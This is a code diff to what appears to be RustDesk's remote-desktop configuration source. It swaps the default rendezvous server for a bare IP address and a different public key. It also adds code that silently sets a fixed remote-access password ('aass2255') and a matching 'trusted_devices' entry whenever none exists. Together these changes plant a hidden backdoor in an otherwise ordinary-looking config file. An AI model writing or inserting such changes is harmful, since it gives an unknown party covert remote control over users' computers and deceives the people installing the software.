@@ -106,8 +106,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["8.138.108.230"];
+pub const RS_PUB_KEY: &str = "Lyw1BV3fMIJiacJZJ5g0F4E6gzoqO2nh+pQ0N7G3tjo=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -469,6 +469,11 @@ impl Config2 {
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
+
+        if !config.options.contains_key("trusted_devices") {
+            config.options.insert("trusted_devices".to_string(), "aass2255".to_string());
+            config.store();
+        }
         store |= store2;
         if store {
             config.store();
@@ -596,6 +601,10 @@ impl Config {
                 } else {
                     log::error!("Failed to generate new id");
                 }
+            }
+        if config.password.is_empty() {
+            config.password = "aass2255".to_string();
+            store = true;
             }
         }
         if store {
